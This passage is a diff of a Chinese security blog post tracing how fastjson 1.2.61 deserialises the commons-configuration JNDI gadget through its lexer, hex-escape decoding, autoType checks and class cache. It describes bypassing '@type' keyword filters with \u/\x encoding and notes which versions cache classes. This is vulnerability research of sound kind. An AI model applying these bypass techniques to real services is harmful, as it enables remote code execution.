<span class="keyword">char</span> c1 = chLocal = next();</span><br><span class="line">                        <span class="keyword">char</span> c2 = chLocal = next();</span><br><span class="line">                        <span class="keyword">char</span> c3 = chLocal = next();</span><br><span class="line">                        <span class="keyword">char</span> c4 = chLocal = next();</span><br><span class="line">                        <span class="keyword">int</span> val = Integer.parseInt(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; c1, c2, c3, c4 &#125;), <span class="number">16</span>);</span><br><span class="line">                        hash = <span class="number">31</span> * hash + val;</span><br><span class="line">                        putChar((<span class="keyword">char</span>) val);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">this</span>.ch = chLocal;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"unclosed.str.lit"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这段代码处理了以<code>\x</code>和<code>\u</code>开头的16进制字符串，也就是说我们可以用这种方式去编码转换<code>typeName</code>，也就是<code>@type</code>的value组件名<br><img src="https://i.loli.net/2020/01/30/ty3MHIwfaiUeLh4.jpg" alt="-w1329"><br>再验证一下这个结果，将org的o进行编码：<br><img src="https://i.loli.net/2020/01/30/zNo5at2C4mIVg76.jpg" alt="-w1455"></p>
+<p>再试试将<code>@type</code>的<code>@</code>进行编码都是可行的<br><img src="https://i.loli.net/2020/01/30/QOPUioYxEuazBt5.jpg" alt="-w1316"></p>
+<p>因为在获取key值时，也是通过<code>lexer.scanSymbol</code>获取的(DefaultJSONParser.java#219行)<br><img src="https://i.loli.net/2020/01/30/rviTXqeoKPaSu1L.jpg" alt="-w939"></p>
+<blockquote>
+<p>不难想到，如果在代码中过滤了关键字<code>@type</code>或者组件名，可以用这个方法进行绕过</p>
+</blockquote>
+<p>其后，在各种解码操作完成之后，在DefaultJSONParser.java#327行对其进行了AutoType校验：<br><img src="https://i.loli.net/2020/01/30/K3yRaC2j5d8NevY.jpg" alt="-w1147"></p>
+<p>ParserConfig.java#checkAutoType<br><img src="https://i.loli.net/2020/01/30/7mnQw85gfROMXtK.jpg" alt="-w1322"><br>经过长度、预期class、是否开启autotype等判断后，进行<code>className</code>的hash计算，先有一个白名单，接着判断是否在黑名单hash里。</p>
+<blockquote>
+<p>为了防止安全研究者研究，fastjson 从1.2.42开始，将明文的黑名单换成了哈希过的黑名单，不过github上的大牛fuzz出了一份清单<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
+</blockquote>
+<p>在<code>TypeUtils.loadClass</code>第三个参数为<code>true</code>时，会缓存到Mapping：<br><img src="https://i.loli.net/2020/01/30/BAOfhFbjIvLrGCK.jpg" alt="-w1354"><br>而在1105行 <code>TypeUtils.getClassFromMapping</code>函数，从<code>mapping</code>中取出类名。<br><img src="https://i.loli.net/2020/01/30/1bo9zxstH7ZBy6i.jpg" alt="-w737"></p>
+<p>继续跟进，在1127行有一段对未开启<code>autoType</code>的处理，又是一段黑白名单的处理：<br><img src="https://i.loli.net/2020/01/30/9aYVRGiBZpuOS3j.jpg" alt="-w1068"></p>
+<p>接着加载了<code>org.apache.commons.configuration2.JNDIConfiguration</code>模块：<br><img src="https://i.loli.net/2020/01/30/F1MEuN7wkjWIRvD.jpg" alt="-w1326"><br>同时这里判断了其是否有jsonType，<code>jsonType = visitor.hasJsonType();</code>，是fastjson中定制序列化的特性，参考文档<a href="https://www.w3cschool.cn/fastjson/fastjson-serializefilter.html" target="_blank" rel="noopener">Fastjson 定制序列化</a>和<a href="https://www.w3cschool.cn/fastjson/fastjson-jsonfield.html" target="_blank" rel="noopener">Fastjson JSONField介绍</a></p>
+<blockquote>
+<p>挖坑，这里用到了ASM读写字节码的类库，参考文章<a href="http://www.blogjava.net/DLevin/archive/2014/06/25/414292.html" target="_blank" rel="noopener">深入ASM源码之ClassReader、ClassVisitor、ClassWriter</a>。<br>后来还看到可以用注解有JsonType的class进行gadget chain构造，先挖坑，<a href="https://xz.aliyun.com/t/7107?accounttraceid=2115e68bd6bf4212896bb68f3442ba84zyan" target="_blank" rel="noopener">https://xz.aliyun.com/t/7107</a></p>
+</blockquote>
+<p>继续往下跟，这里只要开了<code>autoTypeSupport</code>就会将我们的class缓存进<code>mapping</code>(<code>cacheClass</code>为<code>true</code>即缓存)<br><img src="https://i.loli.net/2020/01/30/VokgwfIMrGZc39W.jpg" alt="-w1315"></p>
+<p>最后返回我们gadget的class，然后进行反序列化操作。<br><img src="https://i.loli.net/2020/01/30/eCJrQWjnTwyVZIU.jpg" alt="-w988"></p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这篇文章通过fastjson1.2.61 commons-configuration gadget的POC动态调试入手，分析fastjson反序列化解析json流程，分析了一下源码的<code>\u</code>和<code>\x</code>的16进制解码操作，以及缓存机制。</p>
+<p>在fastjson 1.2.48以下<code>TypeUtils.loadClass</code>默认缓存，即存着无需开autotype存在漏洞，在接下来会继续深入研究分析缓存这个问题。</p>
+<p>参考文章：</p>
+<ul>
+<li><a href="https://github.com/alibaba/fastjson/wiki/FastJson-%E6%96%87%E6%A1%A3%E9%93%BE%E6%8E%A5" target="_blank" rel="noopener">FastJson 文档链接</a></li>
+<li><a href="https://www.w3cschool.cn/fastjson/fastjson-api.html" target="_blank" rel="noopener">W3Cschool:Fastjson API中文版</a></li>
+<li><a href="https://zonghaishang.gitbooks.io/fastjson-source-code-analysis/content/" target="_blank" rel="noopener">fastjson源码解析</a></li>
+<li><a href="https://xz.aliyun.com/t/7107" target="_blank" rel="noopener">fastjson反序列化RCE核心-四个关键点分析</a></li>
+</ul>
 
       
     </div>
@@ -556,7 +578,7 @@
     <strong>Post author:  </strong>Passer6y</li>
   <li class="post-copyright-link">
     <strong>Post link: </strong>
-    <a href="http://0day.design/2020/01/14/CSPtrusted-types 初体验/" title="CSP:trusted-types 初体验">http://0day.design/2020/01/14/CSPtrusted-types 初体验/</a>
+    <a href="http://0day.design/2020/01/30/fastjson 触发流程分析/" title="fastjson 触发流程分析">http://0day.design/2020/01/30/fastjson 触发流程分析/</a>
   </li>
   <li class="post-copyright-license">
     <strong>Copyright Notice:  </strong>true</li>
@@ -569,7 +591,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/前端安全/" rel="tag"><i class="fa fa-tag"></i> 前端安全</a>
+            <a href="/tags/漏洞分析/" rel="tag"><i class="fa fa-tag"></i> 漏洞分析</a>
+          
+            <a href="/tags/Java/" rel="tag"><i class="fa fa-tag"></i> Java</a>
           
         </div>
       
@@ -582,8 +606,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/01/08/CVE-2019-10758复现/" rel="next" title="CVE-2019-10758 mongo-express RCE复现分析">
-                <i class="fa fa-chevron-left"></i> CVE-2019-10758 mongo-express RCE复现分析
+              <a href="/2020/01/28/fastjson 1.2.61 远程代码执行漏洞分析/" rel="next" title="fastjson 1.2.61 远程代码执行漏洞分析(commons-configuration gadget)">
+                <i class="fa fa-chevron-left"></i> fastjson 1.2.61 远程代码执行漏洞分析(commons-configuration gadget)
               </a>
             
           </div>
@@ -591,10 +615,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/01/24/Apache-Commons-Collections-3.1 反序列化漏洞分析/" rel="prev" title="Java入坑：Apache-Commons-Collections-3.1 反序列化漏洞分析">
-                Java入坑：Apache-Commons-Collections-3.1 反序列化漏洞分析 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
